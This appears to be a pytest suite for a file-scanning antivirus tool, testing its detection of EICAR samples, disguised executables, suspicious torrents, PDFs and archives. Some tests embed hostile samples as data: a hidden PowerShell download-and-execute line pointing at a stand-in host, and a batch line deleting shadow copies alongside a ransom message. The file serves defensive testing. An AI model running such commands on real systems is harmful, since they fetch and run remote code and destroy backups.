import io
import zipfile
from pathlib import Path

import pytest

from filescanner import torrent
from filescanner.filetypes import detect_type, double_extension
from filescanner.models import Finding, Severity, Verdict, verdict_for
from filescanner.scanner import Scanner, ScanOptions
from filescanner.signatures import EICAR_BYTES, HashDatabase, file_hashes


def bencode(value) -> bytes:
    if isinstance(value, int):
        return b"i%de" % value
    if isinstance(value, str):
        value = value.encode()
    if isinstance(value, bytes):
        return b"%d:%s" % (len(value), value)
    if isinstance(value, list):
        return b"l" + b"".join(bencode(v) for v in value) + b"e"
    return b"d" + b"".join(bencode(k) + bencode(value[k]) for k in sorted(value)) + b"e"


def make_torrent(files: list[tuple[list[str], int]], name: str = "Download") -> bytes:
    return bencode({"announce": "http://tracker", "info": {
        "name": name, "piece length": 16384, "pieces": b"\0" * 20,
        "files": [{"length": size, "path": path} for path, size in files]}})


@pytest.fixture
def scanner():
    return Scanner(ScanOptions(use_clamav=False))


def scan(scanner, tmp_path, name: str, data: bytes):
    path = tmp_path / name
    path.write_bytes(data)
    return scanner.scan_file(str(path))


def messages(result) -> str:
    return "\n".join(f.message for f in result.findings)


def test_plain_text_is_clean(scanner, tmp_path):
    result = scan(scanner, tmp_path, "notes.txt", b"shopping list: eggs, milk")
    assert result.verdict == Verdict.CLEAN
    assert result.sha256 == file_hashes(str(tmp_path / "notes.txt"))["sha256"]


def test_eicar_test_virus_is_dangerous(scanner, tmp_path):
    assert scan(scanner, tmp_path, "test.com", EICAR_BYTES).verdict == Verdict.DANGEROUS


def test_virus_inside_zip_is_found(scanner, tmp_path):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("docs/readme.txt", "hi")
        zf.writestr("docs/payload.com", EICAR_BYTES)
    result = scan(scanner, tmp_path, "bundle.zip", buf.getvalue())
    assert result.verdict == Verdict.DANGEROUS
    assert "payload.com" in messages(result)


def test_known_bad_hash_is_dangerous(tmp_path):
    data = b"pretend this is malware"
    (tmp_path / "sample.bin").write_bytes(data)
    digest = file_hashes(str(tmp_path / "sample.bin"))["sha256"]
    db_file = tmp_path / "hashes.txt"
    db_file.write_text(f"# comment\n{digest} Trojan.Test\n")
    result = Scanner(ScanOptions(use_clamav=False, hash_db_path=str(db_file))).scan_file(
        str(tmp_path / "sample.bin"))
    assert result.verdict == Verdict.DANGEROUS
    assert "Trojan.Test" in messages(result)


def test_hash_database_ignores_junk_lines(tmp_path):
    db_file = tmp_path / "hashes.txt"
    db_file.write_text("not a hash\n" + "a" * 64 + "\n")
    db = HashDatabase.load(str(db_file))
    assert len(db) == 1


def test_double_extension_is_flagged(scanner, tmp_path):
    result = scan(scanner, tmp_path, "holiday.jpg.exe", b"MZ" + b"\0" * 100)
    assert result.verdict >= Verdict.SUSPICIOUS
    assert "Pretends to be a .jpg" in messages(result)
    assert double_extension("report.pdf.scr") == (".pdf", ".scr")
    assert double_extension("setup.v2.exe") is None


def test_program_disguised_as_video(scanner, tmp_path):
    result = scan(scanner, tmp_path, "movie.mp4", b"MZ" + b"\0" * 100)
    assert result.verdict >= Verdict.SUSPICIOUS
    assert "disguised" in messages(result)


def test_malicious_powershell_script(scanner, tmp_path):
    script = (b"powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\n"
              b"IEX (New-Object Net.WebClient).DownloadString('http://example.test/a')\n")
    result = scan(scanner, tmp_path, "update.ps1", script)
    assert result.verdict == Verdict.SUSPICIOUS


def test_ransomware_note_in_script(scanner, tmp_path):
    result = scan(scanner, tmp_path, "run.bat",
                  b"vssadmin delete shadows /all /quiet\necho Your files have been encrypted")
    assert result.verdict == Verdict.DANGEROUS


def test_keygen_name_is_risky_tool(scanner, tmp_path):
    result = scan(scanner, tmp_path, "Photoshop_Keygen.exe", b"MZ" + b"\0" * 100)
    assert result.verdict == Verdict.RISKY_TOOL


def test_document_mentioning_cracks_is_clean(scanner, tmp_path):
    text = b"Warning: never download a keygen or KMS activator, they often carry malware."
    assert scan(scanner, tmp_path, "README.md", text).verdict == Verdict.CLEAN


def test_program_with_keygen_strings_is_risky_tool(scanner, tmp_path):
    result = scan(scanner, tmp_path, "tool.exe", b"MZ" + b"\0" * 100 + b"Keygen cracked by TEAM")
    assert result.verdict == Verdict.RISKY_TOOL


def test_pdf_with_auto_javascript(scanner, tmp_path):
    pdf = b"%PDF-1.7\n1 0 obj << /OpenAction 2 0 R >>\n2 0 obj << /S /JavaScript /JS (app.alert(1)) >>"
    result = scan(scanner, tmp_path, "invoice.pdf", pdf)
    assert result.verdict == Verdict.SUSPICIOUS


def test_plain_pdf_is_clean(scanner, tmp_path):
    assert scan(scanner, tmp_path, "doc.pdf", b"%PDF-1.4\n1 0 obj << /Type /Catalog >>").verdict == Verdict.CLEAN


def test_encrypted_zip_hiding_program(scanner, tmp_path):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("setup.exe", b"MZ")
    data = bytearray(buf.getvalue())
    # Set the "encrypted" flag on the local header and central directory entry.
    data[6] |= 1
    central = data.find(b"PK\x01\x02")
    data[central + 8] |= 1
    result = scan(scanner, tmp_path, "archive.zip", bytes(data))
    assert "Password-protected archive" in messages(result)


def test_torrent_with_fake_movie(scanner, tmp_path):
    data = make_torrent([(["Film.2026.mp4.exe"], 1000), (["Film.mkv"], 9000), (["codec", "setup.exe"], 10)])
    result = scan(scanner, tmp_path, "Film.torrent", data)
    assert result.verdict >= Verdict.SUSPICIOUS
    text = messages(result)
    assert "Film.2026.mp4.exe" in text
    assert "also contains programs" in text


def test_torrent_with_keygen(scanner, tmp_path):
    data = make_torrent([(["setup.exe"], 10), (["Crack", "keygen.exe"], 10)])
    assert scan(scanner, tmp_path, "Game.torrent", data).verdict == Verdict.RISKY_TOOL


def test_normal_torrent_is_clean(scanner, tmp_path):
    data = make_torrent([(["Holiday.mkv"], 9000), (["Holiday.srt"], 10)])
    assert scan(scanner, tmp_path, "Holiday.torrent", data).verdict == Verdict.CLEAN


def test_damaged_torrent_does_not_crash(scanner, tmp_path):
    result = scan(scanner, tmp_path, "broken.torrent", b"d4:infod4:name")
    assert result.error is None
    assert "damaged" in messages(result)


def test_bdecode_limits_nesting():
    with pytest.raises(torrent.BencodeError):
        torrent.bdecode(b"l" * 200 + b"e" * 200)


def test_folder_scan_and_missing_file(scanner, tmp_path):
    (tmp_path / "a.txt").write_text("a")
    (tmp_path / "sub").mkdir()
    (tmp_path / "sub" / "b.com").write_bytes(EICAR_BYTES)
    results = list(scanner.scan_paths([str(tmp_path), str(tmp_path / "missing.exe")]))
    assert [r.verdict for r in results[:2]] == [Verdict.CLEAN, Verdict.DANGEROUS]
    assert results[2].error


def test_detect_type():
    assert detect_type(b"MZ\x90\x00") == "exe"
    assert detect_type(b"%PDF-1.7") == "pdf"
    assert detect_type(b"hello") is None


def test_verdict_rules():
    medium = Finding("x", Severity.MEDIUM, "m")
    assert verdict_for([]) == Verdict.CLEAN
    assert verdict_for([medium]) == Verdict.CLEAN
    assert verdict_for([medium, Finding("y", Severity.MEDIUM, "n")]) == Verdict.SUSPICIOUS
    assert verdict_for([Finding("x", Severity.MEDIUM, "k", "hacktool")]) == Verdict.RISKY_TOOL
    assert verdict_for([Finding("x", Severity.CRITICAL, "v", "malware")]) == Verdict.DANGEROUS


def test_starts_without_a_console(tmp_path):
    """The windowed .exe has no stdout/stderr; importing the scanner must not crash.

    (oletools' colour output used to crash here on Windows.)
    """
    import subprocess
    import sys

    marker = tmp_path / "ok.txt"
    code = (
        "import sys; sys.stdout = None; sys.stderr = None\n"
        "from filescanner.__main__ import ensure_streams\n"
        "assert ensure_streams() is True\n"
        "import filescanner.scanner, filescanner.documents\n"
        f"open({str(marker)!r}, 'w').write('ok')\n"
    )
    subprocess.run([sys.executable, "-c", code], check=True, cwd=str(Path(__file__).parent.parent))
    assert marker.read_text() == "ok"
